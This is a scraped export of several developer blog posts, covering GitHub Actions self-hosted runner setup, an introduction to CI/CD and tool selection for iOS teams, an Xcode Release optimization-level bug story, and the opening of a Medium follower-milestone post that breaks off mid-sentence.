Automation-PullRequest.yml as an example:# Please refer to the previous text, omitted....jobs: label-pr-by-file-count: # Please refer to the previous text, omitted.... runs-on: [self-hosted-zhgchgli] # Please refer to the previous text, omitted.... # --------- assign-self-if-no-assignee: # Please refer to the previous text, omitted.... runs-on: [self-hosted-zhgchgli] steps: # Please refer to the previous text, omitted....After committing files to the Repo‚Äôs main branch, reopen a PR to trigger and verify the Actions.Back in the Runner Terminal, you can see new tasks coming in, along with their execution and results:Failed because my local computer does not have the gh cli environment installed:After installing gh on a physical computer using brew install gh, run it again:Success! Now this task runs entirely on our own computer, without using GitHub Hosted Runner or incurring any charges.We can click into the Action Log to see which Runner and machine the task is running on:runs-on: [ Runner Label] SettingThis is AND, not OR. GitHub Runner currently does not support OR when selecting Runners to execute.For example: [self-hosted, macOS, app] ‚Üí means the Runner must have all three labels self-hosted, macOS, app to match and execute the task.If a job wants to test results across different runner environments simultaneously, you can use the matrix parameter:jobs: test: runs-on: ${{ matrix.runner }} strategy: matrix: runner: - [self-hosted, linux, high-memory] - [self-hosted, macos, xcode-15] steps: - run: echo \"Running on ${{ matrix.runner }}\"This Job will run concurrently once in each of the following two Runner Labels Runners: self-hosted, linux, high-memory self-hosted, macos, xcode-15 Runner is currently not supported: - OR Select Runner - Runner Weight SettingsRegister Runner as a ServiceYou can refer to the official document ‚ÄúConfiguring the self-hosted runner application as a service‚Äù to register the Runner directly as a system service. This allows it to run in the background (no need to keep the Terminal open in the foreground) and start automatically after boot.If you have multiple runners, remember to adjust the ‚ÄúCustomizing the self-hosted runner service‚Äù settings to register different names. iOS side, I have an issue to investigate and exclude: after switching to background Service, I encounter errors during Archive (suspected to be related to keychain permissions). I didn‚Äôt have time to fix it then, so I temporarily used the foreground Terminal Runner.If you want a traditional app to start automatically on boot, you need to add a launch agent file in ~/Library/LaunchAgents:actions.runner.REPO.RUNNER_NAME.plistÔºö&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"&gt;&lt;plist version=\"1.0\"&gt; &lt;dict&gt; &lt;key&gt;Label&lt;/key&gt; &lt;string&gt;actions.runner.REPO.RUNNER_NAME&lt;/string&gt; &lt;!-- Specify Terminal.app to launch --&gt; &lt;key&gt;ProgramArguments&lt;/key&gt; &lt;array&gt; &lt;string&gt;/usr/bin/open&lt;/string&gt; &lt;string&gt;-a&lt;/string&gt; &lt;string&gt;Terminal&lt;/string&gt; &lt;string&gt;/Users/zhgchgli/Documents/actions-runner/run.sh&lt;/string&gt; &lt;/array&gt; &lt;key&gt;RunAtLoad&lt;/key&gt; &lt;true/&gt; &lt;key&gt;WorkingDirectory&lt;/key&gt; &lt;string&gt;/Users/zhgchgli/Documents/actions-runner&lt;/string&gt; &lt;/dict&gt;&lt;/plist&gt; For those interested in diving deeper into DevOps, please refer to the official k8s Runner documentation.Complete Project RepoOfficial DocumentationFor more detailed setup instructions, please refer to the official manual.AI Can Help!Tested: Provide ChatGPT with complete steps and timing, and it can write GitHub Actions for you to use directly!SummaryYou should now have a basic understanding of GitHub Actions + Self-hosted Runner. In the next article, I will start using an App (iOS) CI/CD as a case study to guide you through building the entire process step by step.Series Articles: CI/CD Practical Guide (Part 1): What is CI/CD? How to Build a Stable and Efficient Development Team with CI/CD? Tool Selection? CI/CD Practical Guide (Part 2): Complete Guide to Using and Building GitHub Actions with Self-hosted Runner CI/CD Practical Guide (Part 3): Implementing CI and CD Workflows for App Projects Using GitHub Actions CI/CD Practical Guide (Part 4): Using Google Apps Script Web App to Connect GitHub Actions for Building a Free and Easy Packaging Tool Platform üç∫ Buy me a beer on PayPal This series of articles took a lot of time and effort to write. If the content helps you or significantly improves your team‚Äôs work efficiency and product quality, please consider buying me a coffee. Thank you for your support!üç∫ Buy me a beer on PayPalüç∫ Buy me a beer on PayPalIf you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "CI/CD Explained: Boost iOS App Development Stability and EfficiencyÔΩúTool Selection Guide", "url": "/posts/zrealm-dev/ci-cd-explained-boost-ios-app-development-stability-and-efficiency-tool-selection-guide-c008a9e8ceca/", "categories": "ZRealm Dev.", "tags": "ios-app-development, cicd, github-actions, jenkins, agile, english, ai-translation", "date": "2025-06-30 15:10:16 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!CI/CD Practical Guide (Part 1): What is CI/CD? How to Build a Stable and Effic...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!CI/CD Practical Guide (Part 1): What is CI/CD? How to Build a Stable and Efficient Development Team with CI/CD? Tool Selection?Using an App (iOS) Team as an example, this guide introduces CI/CD from scratch and the real value it brings after implementation.Photo by Leif Christoph Gottwald2026 Update ‚Äî Pricing changes for GitHub Actions (including Self-hosted Runner) TLDR ‚Äî On January 1, 2026, we are lowering the price of hosted runners, and beginning March 1, 2026, we will charge $0.002 per minute for self-hosted runners. Most customers will not see any change to their bill. Actions will remain free for public repositories.GitHub 2025/12/14 Latest Announcement: January 1, 2026: GitHub-hosted Runner is now cheaper, with price reductions up to 39%. March 1, 2026: Using Self-hosted Runner requires an additional service maintenance fee of $0.002 per minute (regardless of OS), which equals $1 for 500 minutes, and it is still cost-effective at this point. Ô∏è Public repositories still retain the same free tier. GitHub will also invest more resources to enhance GitHub Actions features: Scale Set Client: Simplifies Autoscaling for Self-hosted Runners. multi-label: support restart, improve Runner label experience. Actions Runner Controller (ARC) Update: Enhancing Configuration, Observability, and Version Management. Actions Data Stream: Provides near real-time workflow/runner event data streams for monitoring and analysis. The official pricing calculator has also been updated : GitHub Hosted Runner ‚Äî macOS 3-core (M1): $0.062 USD/minute, 1,000 minutes equals $62 USD Self-Hosted Runner ‚Äî $0.002 USD/minute, 1,000 minutes equals $2 USD Buy the latest model Mac Mini 10-core(M4) yourself for about $600 USD, place it in the office as a Self-hosted Runner, and it will pay off in about a year; it offers better and faster performance with almost unlimited usage (maintenance cost is negligible). You can also use an old M1 MacBook Pro as a Runner at zero cost. *The above does not include electricity or internet fees.PrefaceAfter two experiences building App CI/CD in different development teams, I finally have time to organize the journey from ‚Äúwhy to do it‚Äù to ‚Äúhow to do it.‚Äù While I can‚Äôt guarantee this is the most standard CI/CD workflow, it is definitely a valuable starting point to help your team begin implementation, improve product stability, and overall development efficiency.ChapterThis series will start by explaining ‚ÄúWhat CI/CD is and the value it brings,‚Äù then proceed with a hands-on guide on ‚ÄúHow to build a CI/CD environment using GitHub Actions + self-hosted Runner‚Äù and ‚ÄúImplement CI and CD in App development as an example.‚Äù Finally, it will introduce how to ‚ÄúUse Google Apps Script Web App combined with GitHub Actions to create an easy-to-use App packaging platform for cross-team collaboration.‚Äù I hope this series will be helpful to you. CI/CD Practical Guide (Part 1): What is CI/CD? How to Build a Stable and Efficient Development Team with CI/CD? Tool Selection? CI/CD Practical Guide (Part 2): Complete Guide to Using and Building GitHub Actions with Self-hosted Runner CI/CD Practical Guide (Part 3): Implementing CI and CD Workflows for App Projects with GitHub Actions CI/CD Practical Guide (Part 4): Using Google Apps Script Web App to Connect GitHub Actions and Build a Free, Easy-to-Use Packaging Tool Platform Final OutcomeNo more words, here is the final result.Demo PRDemo Web App (Please refer to the tutorial below for first-time use)CI/CD ‚Äî Entirely developed with GitHub Actions for easy maintenance and scalability.CI: Trigger Unit Tests Automatically on PR Submission Run corresponding tests based on the scope of changed files Only merge the PR after the tests have passed. CD: Google Apps Script Web App (CD Packaging Interface) allows engineers, QA, and PMs to package the app on computers or mobile devices through this website. GitHub Actions Self-hosted Runner uses your own machine for unlimited CI/CD usage. Integrate Firebase App Distribution API to directly obtain the download link for the packaged test version. Automation : Auto-assign self on PR creation Assign Reviewers Automatically and Randomly When Creating a PR Mark PR Size Label Demo Web App/Project Online Demo Please follow the authorization steps below for first-time use (Demo App Only):What is CI/CD?Story ‚Äî Development Process Without CI/CDBefore discussing what CI/CD actually is, let‚Äôs set aside the term ‚ÄúCI/CD‚Äù and first recall how a startup development team without any workflow implemented would typically operate. The general process is roughly illustrated in the diagram below: There is a bug in the product. Developer T creates a branch fix/bug-c from the main branch to fix it, then merges the fix back into the main branch. Next, Developer Z branches off feature/a from the main branch to work on requirement A. Halfway through, they notice something is wrong with the feature. After checking, they find that the current functionality was broken and tests failed, so they inform Developer T to fix it. After all development is complete, Developer Z uses his computer to build the version for QA testing, repeatedly fixing and packaging. Once everything is confirmed, the feature is merged back into the main branch. At the end of the sprint, it‚Äôs time to package and release to users; Developer Z puts aside current tasks to help package from the main branch for QA to perform regression testing, similarly going back and forth fixing issues and repackaging. After completion, the app is packaged for submission. Release to users after Apple/Google review is completed. ProblemIn the story above, we can summarize two major issues.Question 1: There is no unified inspection mechanism for current correct feature changes. Code That Does Not Meet the Coding Style Can Still Be Merged I Can Merge Even If the Build Fails After changes, basic Unit Tests and key checks can fail but still be merged. My environment works correctly, but others may not have the same results. Affecting other developers who are currently working Question 2: Spending a lot of manpower and time on packaging tasks. Packaging requires engineers to manually package, interrupting their current development work. Switching between packaging and development causes high cognitive load. Packaging wait time blocks other development tasks. Engineer time costs money. Manual operations may lead to errors. QA must ask engineers to package (causing back-and-forth communication). CI ‚Äî Continuous Integration (ÊåÅÁ∫åÊï¥Âêà)Corresponding to Question 1, ‚ÄúContinuous Integration‚Äù aims to ensure that all changes automatically run Build &amp; Test in a unified environment, guaranteeing that modifications pass all test cases and meet team standards before entering production ‚Äî ‚Äúcontinuously and automatically ensuring correct code integration into the production environment.‚ÄùYou can also add Nightly Builds and more automated testing steps to ensure stability.CD ‚Äî Continuous Delivery / DeploymentFor Question 2, ‚ÄúContinuous Deployment‚Äù aims to automatically complete the complex packaging and deployment process after the code passes the CI stage without errors, delivering the changes to internal testing (QA, Debug, Staging, Beta‚Ä¶) or external release (Production, Release‚Ä¶). Continuous Deployment: Fully automated deployment directly to the Production environment Continuous Delivery: Automatically deploy only to the Staging/Debug environment; manual verification is required before deploying to the Production environment. In the context of App development, it leans more towards Continuous Delivery, where we want a manual check before the App is officially released to ensure the release timing and functionality are correct.Story ‚Äî Building a Stable and Efficient Development Team through CI/CDLooking back at our story, after implementing CI/CD: CIAll changes must pass automated tests before merging into the main branch. A Nightly Build with scheduled automated tests is added to improve stability. CDUsing CD packaging uniformly, Developer T and Developer Z can fully focus on business development, reducing manual communication and operational errors. Team Work Efficiency and Product Stability üöÄüöÄüöÄüöÄüöÄThe Value of CI/CDCombining the core Agile principle of ‚Äúsmall steps, fast iterations,‚Äù CI/CD provides the foundation for stability and work efficiency during frequent continuous feature iterations.Automatically Standardize Verification of Iteration Results Ensure all adjustments meet the expected results, do not affect other functions, and do not impact other team members.Automate Tedious Deployment Processes Allow team members to focus on core business development and reduce human operational errorsCI/CD EffectivenessLooking back at the 2021 Pinkoi talk ‚Äú2021 Pinkoi Tech Career Talk ‚Äî Secrets of High-Efficiency Engineering Teams,‚Äù the core message was essentially the same: ‚Äúautomation, reducing human dependencies, and focusing on core business.‚Äù Implementing CI/CD fully aligns with these three directions, allowing us to estimate its effectiveness using the same approach.Another point to highlight is the cost of context switching:After working continuously for a period, we enter a ‚Äúflow‚Äù state, where our thoughts and productivity peak, enabling the most effective output. However, if interrupted, it takes time to return to this flow state‚Äîhere, we use 30 minutes as an example.In scenarios without CI/CD, it might be: spending a lot of time only to find out something was broken, then going back to communicate and fix it (CI), and QA/PM asking engineers to help package the test version of the app (CD).CI/CD Effectiveness EstimationTeam size: 6 people / calculated per monthHere, we use a monthly basis as an example. Without a CI/CD process, there are 4 incidents per month where the main branch is accidentally broken, causing about 720 minutes of fixing and communication costs. Additionally, monthly packaging of test and release versions, along with errors caused by manual operations, add up to about 1,010 minutes. With an engineer‚Äôs monthly salary of 80,000, this results in approximately 13,000 in wasted costs each month. Missed estimating Starting 2026‚Äì03‚Äì01, Self-hosted will require a maintenance fee of $0.002 USD per minute, which means running for 500 minutes costs $1 USD.CI/CD Setup Cost Labor Cost:Based on this series, it is estimated that 1 person spending 10 days = 4,800 minutes can complete the setup. (~= NT$36,384) Device and Operating Costs:Using GitHub Actions self-hosted Runner only requires purchasing 1‚Äì2 Mac Minis upfront or using existing retired MacBook Pros as CI/CD Runners for service.For example, a 6-person team purchasing a brand new Mac Mini: 32G RAM M4 Mini (= NT$40,900) The total cost is about NT$80,000, with benefits starting to be realized after about six months. Disclaimer: This is just one way to calculate benefits and may not be the most accurate; it is meant to give everyone a concept to extend, allowing management to see the value of CI/CD and thus authorize the promotion and completion of the entire workflow.Tool Selection for CI/CDCloud Services Bitrise / XCode Cloud Bitrise: One of the earliest cloud services focused on providing App CI/CD. My first experience with CI/CD was using Bitrise. It offers a user-friendly and intuitive step editor, allowing quick setup of App CI/CD workflows.Drawbacks: Initially, it was a $99 flat rate. When Apple‚Äôs M-series processors were released, they switched to usage-based billing (a ‚Äúbait and switch‚Äù tactic). At that time, our team‚Äôs usage cost at least $500 per month, so we migrated to GitHub Actions.However, recently checking their website, they now offer 1 App / 1 Concurrent / unlimited usage / $89 per month. XCode Cloud: 100 hours / 1 month / $50 USD. The advantage is its deep integration with XCode and app development; however, the downside is it does not support Android, and customizing certain steps can be difficult. Still, for small pure iOS apps, I would consider using it again. Really worried about cloud services turning into a subscription trap, so considering on-premise services for better control.On-Premise Services Jenkins / GitHub Actions / Gitlab CI/CD Gitlab CI/CD:It was launched before GitHub Actions and provides more complete features. However, since our project is hosted on GitHub, we do not consider using Gitlab CI/CD. Both have similar functions, and this series will use GitHub Actions as an example. GitHub ActionsGitHub launched its CI/CD service in 2018, fully integrated with GitHub projects. It has continuously improved over the years, offering many pre-built steps (Marketplace) ready to use. It supports self-hosted runners, allowing unlimited use of your own machines (effectively a hybrid cloud). Jenkins:An open-source, free tool dedicated to CI/CD. It is old but powerful; Jenkins covers everything from application-level task design and permission management to underlying service dispatch and execution. It also has Plugins that can be used directly and was a key tool for early DevOps CI/CD. Jenkins v.s. GitHub ActionsTL;DR For an App Team without dedicated DevOps, expecting developers to set up and maintain a Jenkins environment from scratch is too challenging, with few people skilled enough and potential network security issues. Choosing GitHub Actions allows developers to focus solely on designing the CI/CD process. By briefly reviewing the official documentation on writing workflows and starting Runners, they can quickly build a free, stable, and secure CI/CD service. The following comparison is based solely on setting up App CI/CD and may not apply to all technical scenarios.Setup and Maintenance Difficulty Jenkins¬†¬ª&gt; GitHub ActionsHere is a simple layered diagram to explain the difference between the two. As mentioned before, Jenkins covers all functions from top to bottom, making self-hosting much more complex. In contrast, GitHub Actions only requires writing YAML workflows on GitHub. The local machine just needs to register the GitHub self-hosted Runner (completed with 5 commands), and GitHub will automatically dispatch tasks to the local machine. Other matters, such as upgrading GitHub Actions/Runner versions or task dispatch issues, are maintained by GitHub, so we do not need to handle them.Another troublesome point is that Jenkins is a service independent of Git, so communication between them requires APIs (e.g., GitHub API/WebHook), making the setup more complicated.I previously surveyed about 30 iOS developers around me; only a handful (2) understood Jenkins, while more than 10 were using GitHub Actions. After all, you can complete CI/CD tasks just by writing some YAML.Learning Difficulty Jenkins¬†¬ª&gt; GitHub ActionsRefer only to the official documentation to learn GitHub Actions YAML commands and how to set up your own Runner locally.Stability: GitHub Actions &gt; JenkinsIn this aspect, I think GitHub Actions slightly outperforms Jenkins.Jenkins may crash due to system upgrades or installing conflicting plugins (but if it runs smoothly and you don‚Äôt touch it, it basically has no issues).GitHub Actions depends on GitHub Service Status (if GitHub is down, it will be affected too), but outages are rare, with an average uptime of 99.9%. If issues occur, just wait for them to be fixed.Security: GitHub Actions &gt; JenkinsConsidering that GitHub Actions/Runner services are maintained and automatically updated by GitHub itself, this may be safer compared to Jenkins, which requires manual updates.Additionally, communication between Jenkins and GitHub requires opening API/WebHook ports, which is relatively risky. GitHub and GitHub Actions integrate seamlessly, and the interaction between GitHub Actions and the self-hosted Runner follows an observer pattern. The self-hosted Runner pulls tasks from GitHub, so the Runner itself does not need to expose any external interfaces.However, in a fully closed network environment, Jenkins is more secure than GitHub Actions.Permission Management Jenkins¬†¬ª&gt; GitHub ActionsThis point needs special comparison: Jenkins allows separate account login permissions for control; GitHub Actions is directly tied to the GitHub Repo, so only those with repo permissions can use it. That is why the following articles use GAS Web App to build a cross-team operation platform.Moving from Jenkins to GitHub Actions at ScaleIn teams with a complete DevOps team, Jenkins is undoubtedly still the preferred choice. After all, in other fields (such as Web, backend, Java‚Ä¶), Jenkins has been running the longest, offers the most useful plugins, and can unify the CI/CD setup for all teams, making management easier. It also supports complex CI/CD scenarios like automatic frontend deployment after backend deployment. GitHub Actions later also supports cross-repo Actions/Runner.Third-Party Plugin Availability Jenkins &gt; GitHub ActionsIn terms of quantity, GitHub Actions outnumber Jenkins, but Jenkins offers deeper and more powerful CI/CD features. Many of GitHub Actions are simply automation functions.Feature Depth Jenkins¬†¬ª&gt; GitHub ActionsThis aspect is unmatched; Jenkins has been around for nearly 20 years, while GitHub Actions still needs to add many features. For example: permission management, secret management (currently only plain text is supported, so key files must be converted to plain text first), Cache/Artifact currently only supports Cloud, and so on.Additionally, GitHub Self-hosted Runner also supports Docker or k8s.Customized Deep Jenkins¬†¬ª&gt; GitHub ActionsJenkins is fully controlled in-house, allowing greater customization of permissions that can affect the entire system. GitHub Actions can only customize different steps at the application level.For example, since the built-in Artifacts in GitHub Actions do not support self-hosted runners, you can only use a sh copy command in the steps to move files to another directory, and cannot customize Artifacts on your own. App CI/CD scenarios do not require very advanced features.Usability GitHub Actions¬†¬ª&gt; JenkinsOn the interface side, GitHub Actions is a newer tool and is easier to use than Jenkins;In terms of script configuration, Jenkins uses Pipeline Scripts stored on Jenkins, while GitHub Actions uses YAML files managed within the project‚Äôs Git repository, making it easier to set up than Jenkins.Cost Risk Jenkins &gt; GitHub ActionsJenkins is fully open-source and free to use, while GitHub Actions is partially open-source but its task dispatching and execution run on GitHub‚Äôs closed SaaS service. Currently, GitHub Actions is completely free; fees apply only when using GitHub-hosted Runners. Starting from 2026-03-01, self-hosted Runners will also incur a maintenance fee of $0.002 USD per minute. Public repositories have free usage quotas for these charges.Purpose of Google Apps Script Web App and Why It Was ChosenAnother tool choice is Google Apps Script Web App. The reason for adding this is that GitHub Actions‚Äô built-in form feature is too basic (the interface is too technical and static), and its execution permissions are tied to the GitHub Repo. This makes it very inconvenient to provide access to other functional team members.As follows:CD packaging usually requires the operator to fill in some information, such as Release Notes.Therefore, we need an ‚Äúinterface‚Äù tool to provide to other team members or even to make it easier for our own engineers to use.Required Scenario: Fill in the required information on this more user-friendly ‚Äúinterface,‚Äù connect to project management tools (e.g., Jira, Asana) to get tasks, or directly fetch the PR list from GitHub. Select from the dropdown menu and submit, then trigger GitHub Actions for packaging via the GitHub API.SlackThe first time we implemented CI/CD, we chose to integrate with the Slack API to achieve a similar effect:https://slack.com/intl/zh-tw/blog/productivity/workflow-builder-tools-automation-examples Partners can directly fill out forms in Slack to trigger CD packaging and receive Slack notificationsThe operation is smooth and unified within daily office tools (SSOT), requiring no relearning; however, the underlying issue is very high development and maintenance costs. One reason is that Slack Outgoing-Webhook API demands a very fast response (within 3 seconds), which basically rules out using simple FAAS services for integration (e.g., Cloud Functions, GAS, Lambda‚Ä¶).Previously, a team member interested in automation and backend development created a complete backend service using Kotlin + ktor, then deployed a server on GCP for Slack integration. Development and maintenance costs are extremely high, and handover is difficult.Google Apps Script ‚Äî Web AppPreviously shared ‚ÄúUsing Google Apps Script Web App Form to Integrate Github Action CI/CD Workflow‚Äù:Demo Web App Form URLThe advantages of using Google Apps Script ‚Äî Web App are: Website Web With Google Workspace enterprise account permission management, access can be restricted to only Google accounts within the organization. Completely Free Function as a Service requires no self-hosted server maintenance Easier to maintain and hand over Operable on mobile devices AI Can Help!Whether it‚Äôs ChatGPT or other AI tools, they are very familiar with GAS and can directly help us create packaging forms and connect to the GitHub API. Can also integrate with Jira, Asana, and Slack notification APIs For the second promotion, I switched to using a GAS Web App for the team, which also received great feedback. The only difference from Slack is that you need to bookmark one more URL. When packaging is needed, just open the URL and operate the packaging through the web form.Complete App CI/CD Tool WorkflowHere is the complete workflow. The next article will gradually introduce how to use and integrate each tool.Tool Roles: GitHub Actions: CI/CD workflow script code GitHub Actions ‚Äî Self-hosted Runner: The actual environment where CI/CD runs, using a self-hosted runner. You only need to cover the machine cost and can run tasks without usage limits. Google Apps Script Web App: Since packaging is not always done by engineers, a platform is needed for cross-functional team members; GAS Web App can quickly create a web tool and share the URL for others to use. Asana/Jira: Project management tools that integrate with the GAS Web App, allowing QA/PM to directly select tasks to package. Slack: Used to receive execution result notifications Scenario: End-User (QA/PM/PD/Developer): Submit the packaging form using GAS Web App (fetch the Branch corresponding to the Jira or Asana task) -&gt; GAS calls GitHub API -&gt; triggers CD packaging GitHub Actions &lt;- GitHub self-hosted runner listens for the task and pulls it to the machine for execution -&gt; upon completion, Slack notification is sent and GAS Web App packaging status is updated. End-User (Developer): Open PR, push new commit to PR -&gt; trigger CI testing process &lt;- GitHub self-hosted runner listens for tasks and pulls them to the machine for execution -&gt; after completion, comment test results and update Checks. SummaryThis article mainly provides an introduction to what CI/CD is and the benefits it brings. Starting from the next article, we will dive into the technical aspects, guiding you step-by-step to understand and implement GitHub Actions CI/CD until the final result described earlier is achieved.Series Articles: CI/CD Practical Guide (Part 1): What is CI/CD? How to Build a Stable and Efficient Development Team with CI/CD? Tool Selection? CI/CD Practical Guide (Part 2): Complete Guide to Using and Setting Up GitHub Actions and Self-hosted Runner CI/CD Practical Guide (Part 3): Implementing CI and CD Workflows for App Projects with GitHub Actions CI/CD Practical Guide (Part 4): Using Google Apps Script Web App to Connect GitHub Actions and Build a Free, Easy-to-Use Packaging Tool Platform üç∫ Buy me a beer on PayPal This series took a lot of time and effort to write. If the content helps you and truly improves your team‚Äôs work efficiency and product quality, please consider buying me a coffee. Thank you for your support!üç∫ Buy me a beer on PayPalüç∫ Buy me a beer on PayPalIf you have any questions or feedback, feel free to contact me . üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "XCode Build Configuration ReleaseÔΩúDetect Ghost Crashes & Logic Bugs Before Upgrade", "url": "/posts/zrealm-dev/xcode-build-configuration-release-detect-ghost-crashes-logic-bugs-before-upgrade-7508328d8b8d/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios-app-development, xcode, build-settings, swift, troubleshooting", "date": "2025-04-11 22:50:31 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off![Spirit Notes] Things to Test When Upgrading XCode‚Ä¶Encounter ghost crashes or ...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off![Spirit Notes] Things to Test When Upgrading XCode‚Ä¶Encounter ghost crashes or logic issues that only occur in the Build Configuration Release (official/online version), while Debug runs perfectly fine.Photo by Tommaso PecchioliTL;DRBefore packaging and publishing a project with the new XCode, besides directly Build &amp; Run to check for layout issues or errors, please also remember to try: App Target Select Build Settings Search for Optimization Level Locate the Optimization Level section Set the Debug environment to the same value as Release (e.g. Fastest, Smallest [-Os]) Build &amp; Run to check for any issues Not choosing to directly upload to TestFlight for testing allows us to conveniently use breakpoints to locate the root cause of issues in real time. If users report issues (crashes or abnormal behavior) in the Release (official, online) version, but developers cannot reproduce them locally, try changing this setting and testing it locally.Possible Issues The program looks correct, but the results are abnormal. The app crashes in places where it shouldn‚Äôt crash. The above works fine in the Debug environment with Optimization Level = None [-O0], but only occurs with Optimization Level = Fastest, Smallest [-Os], which is the Release setting.SolutionIf there are issues, they are mostly unrelated to the developer; they are caused by bugs in XCode optimization. If you must use this version of XCode for packaging, you can only adjust the code yourself as a workaround and wait for a new XCode version to see if it works properly. It is not recommended to directly change Release to None, as it may cause more issues.Story TimeThe following are real problem scenarios I have encountered in my work over the past few years.Story 1 ‚Äî App keeps showing the rate app invitation popupOur app previously had a feature that, when opened, would ‚Äúinvite users to rate the app in the store.‚Äù The rule was to show this prompt three times and then stop. However, many users reported that the prompt appears every time they open the app, lasting for a long time and becoming very annoying.However, from the code perspective and when building &amp; running locally on the simulator or real device, there is no problem. We have also tested various edge case scenarios but could not reproduce the issue. I even wrote a UI Test that repeatedly runs the path and clears data to retry‚Ä¶ after thousands of runs, no issues occurred.I remember that night I was frustrated until after 3 AM, completely at a loss and unable to figure out the problem. I started aimlessly checking the project settings when suddenly I had a flash of inspiration to try setting all the Build Settings to Release values. That‚Äôs when I discovered the issue was reproducible with Optimization Level = Fastest, Smallest [-Os], which helped me pinpoint the source of the problem.Pseudocodevar invitedTimes = 0 // Loaded from UserDefaults; will be saved back after updatefunc requestAppStoreReviewIfNeeded() { defer { invitedTimes += 1 // Works for now, but may have unintended side effects } guard invitedTimes &lt; 3 else { return } self.present(AppStoreReviewRequestAlert())} This code was developed by predecessors. Although it has side effects, the logic is correct, it compiles properly, and previous versions ran without issues.But when I set Optimization Level = Fastest, Smallest [-Os] and then put a breakpoint to print the value, I found an anomaly. After invitedTimes += 1, it suddenly explodes into -24760045646797946, a huge negative number. Because of this, the user is prompted to invite a review every time.At that time, I directly changed the defer usage here, and no users reported similar issues afterward; later, when testing subsequent XCode versions, the same code with Optimization Level = Fastest, Smallest [-Os] also worked properly.Story 2 ‚Äî A Certain Page Crashes ImmediatelyDuring internal testing of the Release (Testflight) version, we found that a page (WebView) would crash immediately upon clicking. However, the engineers had no issues when building and running on the simulator or device. Each time we suspected a problem, we packaged a version with added logs or attempted fixes and tested it on Testflight, which was very frustrating and time-consuming. This triggered my previous fear of being controlled, so I immediately asked a colleague to change the local setting to Optimization Level = Fastest, Smallest [-Os]. After building and running, the crash issue was successfully reproduced locally.The main issue lies in a variable within our custom WebView Obj-C code that becomes null when compiled with Optimization Level = Fastest, Smallest [-Os]. The cause is unknown, so we can only add extra checks for protection. It worked fine in previous versions, so we will have to wait for the new XCode release to see if the problem is resolved.SummaryActually, I have fallen into this trap more than twice, and some instances I don‚Äôt even remember. In short, here is a mindset to keep in mind: When packaging and submitting with the new XCode version for the first time, it‚Äôs best to test this. The issue only occurs in Release (official, online version). Basically, this is the problem. You can directly change the settings locally to see if it can be reproduced. If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Medium Growth Milestone: Achieve 1,000 Followers with Proven Strategies", "url": "/posts/zrealm-dev/medium-growth-milestone-achieve-1-000-followers-with-proven-strategies-6fd11e9704f2/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios-app-development, medium, writer, followers, milestones", "date": "2025-04-03 20:51:56 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!A Milestone of 1,000 Followers On MediumOperating on Medium for seven years, I...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!A Milestone of 1,000 Followers On MediumOperating on Medium for seven years, I have finally reached the milestone of 1,000 followers! English version down below.Running Medium for 7 years, with 112 articles totaling about 130,000 words, and investing over 800 hours, I finally achieved my dream goal on April 2, 2025 ‚Äî 1,000 Followers.It‚Äôs a long story. Since 2018, I shifted from Web to App development. Everything was new to me, and I always had a thirst for knowledge. I constantly researched on my own, learning while doing, and eventually completed and launched my first App.Since I was entirely self-taught, I benefited greatly from many online articles left by predecessors. This inspired me to write articles to promote mutual learning, hoping to create a positive cycle myself.At first, I was caught in the ‚Äúsharing dilemma,‚Äù always worried that the content wasn‚Äôt complete enough, feared criticism, and was even more afraid it wouldn‚Äôt help readers at all.But later, I realized that writing an article is like planting a seed. One day, a developer facing a similar problem might find help in my article or use it as a starting point for deeper exploration.Even if the content might not be seen by many, if I don‚Äôt start, 